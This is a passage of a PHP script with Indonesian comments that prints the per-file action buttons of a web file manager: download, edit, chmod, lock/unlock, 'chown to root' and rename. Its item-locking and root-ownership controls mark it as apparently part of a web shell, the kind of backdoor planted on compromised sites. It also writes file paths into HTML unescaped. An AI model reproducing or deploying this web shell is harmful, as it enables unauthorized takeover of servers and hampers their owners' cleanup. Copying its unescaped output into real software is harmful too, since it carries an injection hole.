        echo "<a href='?download=" . urlencode($p) . "' class='btn btn-sm btn-info'><i class='fa fa-download' style='font-size:24px'></i></a>";
        echo "<a href='?edit=" . urlencode($p) . "&d=" . urlencode($cwd) . "' class='btn btn-sm btn-warning'><i class='fa fa-edit' style='font-size:24px'></i></a>";
    }

    // Tombol CHMOD untuk file dan folder
    // Tombol CHMOD akan dinonaktifkan jika item terkunci
    if ($is_locked) {
        echo "<button class='btn btn-sm btn-primary' disabled><i class='fa fa-key' style='font-size:24px'></i></button>";
    } else {
        echo "<a href='?chmod=" . urlencode($p) . "&d=" . urlencode($cwd) . "' class='btn btn-sm btn-primary'><i class='fa fa-key' style='font-size:24px'></i></a>";
    }

    // NEW: Lock/Unlock Buttons
    if ($is_locked) {
        echo "<form method='post' class='d-flex'>
                <input type='hidden' name='target_item' value='$p'>
                <button name='unlock_item' class='btn btn-sm btn-success'><i class='fa fa-unlock' style='font-size:24px'></i> Unlock</button>
              </form>";
    } else {
        echo "<form method='post' class='d-flex'>
                <input type='hidden' name='target_item' value='$p'>
                <button name='lock_item' class='btn btn-sm btn-dark'><i class='fa fa-lock' style='font-size:24px'></i> Lock</button>
              </form>";
    }

    // NEW: Chown to Root Button
    echo "<form method='post' class='d-flex' onsubmit='return confirm(\"Apakah Anda yakin ingin mengubah kepemilikan item ini menjadi root? Ini mungkin memerlukan hak akses khusus.\");'>
            <input type='hidden' name='target_item' value='$p'>
            <button name='chown_to_root' class='btn btn-sm btn-danger'><i class='fa fa-user-secret' style='font-size:24px'></i> Root</button>
          </form>";

    echo "<form method='post' class='d-flex'>
            <input type='hidden' name='old' value='$p'>
            <input type='text' name='new' placeholder='Rename' class='form-control form-control-sm'>
            <button name='rename' class='btn btn-sm btn-secondary'>Rename</button>
        </form>
    </td></tr>";
}
echo "</tbody></table></body></html>";
?>
